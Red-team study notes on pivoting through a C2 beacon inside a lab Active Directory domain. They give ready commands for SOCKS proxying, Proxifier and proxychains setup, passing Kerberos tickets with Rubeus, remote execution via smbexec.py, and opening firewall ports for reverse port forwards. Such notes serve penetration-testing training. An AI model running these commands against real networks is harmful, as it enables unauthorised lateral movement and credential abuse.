tactic used to proxy traffic in or out of a network, using the beacon as the pivot point

SOCKS (socket secure) proxy:
  protocol that exchanges network packets between a client and server via a proxy server
  to start the proxy via beacon:
    beacon> socks 1080
  to connect on windows using proxifier:
    create a new proxy server profile, Profile > Proxy Servers
    enter the IP of the team server and the port (e.g. 1080)
    select the corresponding "SOCKS" protocol
    we can then add a proxification rule to specify the IP (range) of our target host
  to authenticate via windows:
    authenticate using kerberos tickets (NOTE: add the hostname first, PS C:\Users\Attacker> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1')
      create a credential object:
        PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO.COM\rsteel
      perform pass the authentication material:
        PS C:\Users\Attacker> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server lon-dc-1
      start a new process as the user:
        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:CONTOSO.COM /username:rsteel /password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /show
      query AD to get a ticket:
        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /dc:lon-dc-1 /ptt
      verify by running klist!
    once were authenticated, we can query the target DC
      e.g. PS C:\Users\Attacker> ipmo ActiveDirectory
          PS C:\Users\Attacker> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server lon-dc-1 | select DistinguishedName
  proxychains:
    first we must edit the last line of /etc/proxychains.conf to match our IP and port
      e.g. socks4 10.0.0.5 1080
    then we can run commands prepended with 'proxychains'
      e.g. proxychains smbexec.py 'CONTOSO/rsteel:Passw0rd!@lon-ws-1'
    to authenticate via linux:
      authenticate using kerberos tickets in ccache format
        convert to ccache:
          $ ticketConverter.py rsteel.kirbi rsteel.ccache
        set env variable:
          $ export KRB5CCNAME=/mnt/c/Users/Attacker/Desktop/rsteel.ccache
        usage example:
          $ proxychains smbexec.py -no-pass -k -dc-ip lon-dc-1 CONTOSO.COM/rsteel@lon-ws-1

reverse port forwarding:
  rather than tunneling traffic in from outside, it allows us to tunnel traffic out from the inside
  syntax: rportfwd [bind port] [forward host] [forward port]
          instructs beacon to listen on bind port
          team server forwards traffic to forward host and port
          if there is a response, it will be sent back and forwarded to original caller
  useful scenario:
    RCE on a target but no ability to upload payloads 
    we can start a reverse port forward!
      say we want to use port 28190, we must add a firewall rule to allow port 28190 inbound
        beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
      now we can begin our port forward:
        beacon> rportfwd 28190 localhost 80
      clean up!
        beacon> rportfwd stop 28190
        beacon> run netsh advfirewall firewall delete rule name="Debug"
